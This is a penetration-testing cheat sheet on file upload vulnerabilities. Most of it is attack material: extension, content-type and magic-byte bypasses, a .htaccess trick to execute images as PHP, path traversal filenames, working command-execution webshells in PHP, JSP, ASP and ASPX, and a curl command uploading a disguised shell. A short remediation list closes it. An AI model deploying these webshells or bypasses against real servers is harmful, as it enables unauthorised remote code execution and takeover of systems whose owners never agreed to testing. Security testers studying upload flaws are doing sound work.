# File Upload Vulnerabilities — Complete Attack Guide

## 1. Detection

### Finding Upload Endpoints
```
search for: upload, file, attachment, import, avatar, photo, image
common paths: /upload, /api/upload, /file/upload, /admin/import
```

## 2. Bypass Techniques

### 2.1 Extension Bypass
```
.php.jpg
.php.png
.php%00.jpg
.php;.jpg (IIS)
.php.jpg.png
.pHp
.PHP
.phtml
.pht
.phps
.phar
```

### 2.2 Content-Type Bypass
```
Content-Type: image/jpeg   (but file is .php)
Content-Type: image/png
Content-Type: image/gif
```

### 2.3 File Header (Magic Bytes)
```
GIF89a;<?php system('id');?>      # GIF header
\x89PNG\r\n\x1a\n;<?php ...     # PNG header
\xff\xd8\xff\xe0;<?php ...       # JPEG header
```

### 2.4 Double Extension
```
shell.php.jpg
shell.php.png
shell.jpg.php
```

### 2.5 .htaccess Upload
```
# Upload .htaccess with:
AddType application/x-httpd-php .jpg
# Then upload shell.jpg → executed as PHP
```

### 2.6 Race Condition
```
1. Upload shell.php
2. Before deletion/modification, quickly access it
3. Use concurrent requests to increase timing window
```

### 2.7 Path Traversal
```
filename: ../../../shell.php
filename: ..\..\..\shell.php
```

## 3. Webshell Payloads

### PHP
```php
<?php system($_GET['cmd']);?>
<?php eval($_POST['code']);?>
<?php echo shell_exec($_GET['cmd']);?>
<?php passthru($_GET['cmd']);?>
```

### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### ASP
```asp
<%Set rs=Server.CreateObject("WSCRIPT.SHELL"):rs.Exec("cmd.exe /c "&Request("cmd")).StdOut.ReadAll()%>
```

### ASPX
```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

## 4. Tools

### nuclei
```bash
nuclei -u http://target -tags upload
```

### Manual Testing
```bash
# Upload with curl
curl -X POST http://target/upload -F "file=@shell.php;filename=shell.jpg" -F "type=image/jpeg"
```

## 5. Remediation

1. **Validate by content, not extension** — Check magic bytes
2. **Generate random filenames** — Never use user-provided filename
3. **Store outside web root** — Files shouldn't be directly accessible
4. **Size limits** — Prevent DoS via large uploads
5. **Antivirus scanning** — Scan uploaded files
6. **Disable script execution in upload directory** — `.htaccess` deny or server config
